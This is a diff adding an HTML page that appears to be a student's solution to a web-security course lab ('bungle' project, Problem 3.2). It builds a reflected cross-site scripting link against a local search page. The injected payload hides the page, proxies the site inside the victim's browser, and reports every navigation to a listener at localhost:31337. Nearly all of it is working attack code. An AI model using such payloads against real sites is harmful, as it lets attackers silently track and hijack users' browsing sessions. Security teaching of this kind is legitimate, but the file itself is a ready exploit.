@@ -1,0 +1,111 @@
+
+<meta charset="utf-8">
+<script src='http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js'></script>
+<script>
+// Extend this function:
+function payload() {
+    function log(data) {
+        console.log($.param(data))
+        $.get(`http://localhost:31337/`, data);
+    }
+    function proxy(href) {
+        history.replaceState({page: 1}, ``, `?=`);
+        $(`html`).load(href, function(){
+            $(`html`).show();
+            log({event: `nav`, uri: href});
+            $(`#query`).val(`pwned!`);
+        });
+    }
+    $(`html`).hide();
+    proxy(`./`);
+    
+}
+
+function makeLink() {
+    return `http://localhost/project2/search?xssdefense=3&csrfdefense=1&q=` +
+    encodeURIComponent(`<script>` + payload.toString() +
+    `;payload(); <` + `/script>`);
+
+}
+
+
+$(function() {
+    var url1 = makeLink(1, 3, "http://localhost/project2/", "http://localhost:31337/");
+    $("h3").html("<a target=\"run\" href=\"" + url1 + "\">a</a>");
+});
+</script>
+
+
+
+<title>Problem 3.2</title>
+    <style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family:'Courier New', Courier;
+        background:black;
+        color: #00ff00;
+        text-align: center;
+    }
+
+    h1 {
+        color: #00ff00;
+        padding: 20px;
+        font-size: 30px;
+        text-shadow: 0 0 10px #00ff00;
+    }
+
+    h3 {
+        margin: 20px 0;
+        font-size: 24px;
+        color: #00ff00;
+    }
+
+    a {
+        display: inline-block;
+        margin: 10px;
+        padding: 10px 20px;
+        background-color: #111;
+        color: #00ff00;
+        text-decoration: none;
+        border-radius: 5px;
+        border: 1px solid #00ff00;
+        font-family: 'Courier New', Courier, monospace;
+        transition: background-color 0.3s, box-shadow 0.3s;
+    }
+
+    a:hover {
+        background-color: #00ff00;
+        color: black;
+        box-shadow: 0 0 10px #00ff00;
+    }
+
+    .console-text {
+        font-size: 18px;
+        color: #00ff00;
+        animation: blink 1s step-end infinite;
+    }
+
+
+    @keyframes blink {
+        from { visibility: visible; }
+        to { visibility: hidden; }
+    }
+
+    </style>
+
+</head>
+<body>
+    <div class="two">
+        <h1> < > problem_3-3_bungle_lab &lt/&gt </h1>
+    </div>
+
+<div class="two alt-two">
+    
+    <div style="color:rgb(255, 255, 255); font-family:'Courier New', Courier, monospace">
+        Click a link below to explore!        
+    </div>
+    <h3></h3>
+</div>
+</body>
+</html>
